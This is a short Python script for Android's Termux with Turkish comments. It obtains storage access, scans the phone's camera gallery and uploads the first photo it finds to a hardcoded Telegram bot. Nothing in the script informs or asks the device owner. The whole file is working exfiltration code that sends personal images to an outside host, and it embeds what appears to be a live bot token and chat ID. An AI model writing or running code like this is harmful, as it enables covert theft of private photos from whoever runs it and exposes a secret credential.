import os
import requests
import time
import glob

# Telegram Bilgileri
TELEGRAM_BOT_TOKEN = "7635752761:AAGNNpMU3ST3LM62VLRSVXQmkIPX3Hz0xuo"
CHAT_ID = "7561737990"

def send_telegram_photo(photo_path):
    """Belirtilen fotoğrafı Telegram'a gönderir."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    with open(photo_path, "rb") as photo:
        files = {"photo": photo}
        data = {"chat_id": CHAT_ID}
        try:
            response = requests.post(url, files=files, data=data)
            print(response.json())
        except Exception as e:
            print(f"Fotoğraf gönderme hatası: {e}")

# Termux depolama erişimi için izin al
os.system("termux-setup-storage")
time.sleep(2)  # İzin işlemi için bekleme süresi

# Medya dosyalarını tarat
os.system("termux-media-scan ~/storage/dcim")

# Galerideki ilk fotoğrafı bul
photo_list = glob.glob("/data/data/com.termux/files/home/storage/dcim/*/*.jpg") + \
             glob.glob("/data/data/com.termux/files/home/storage/dcim/*/*.png")

if photo_list:
    first_photo = photo_list[0]
    send_telegram_photo(first_photo)
else:
    print("Galeri boş veya erişim izni yok.")
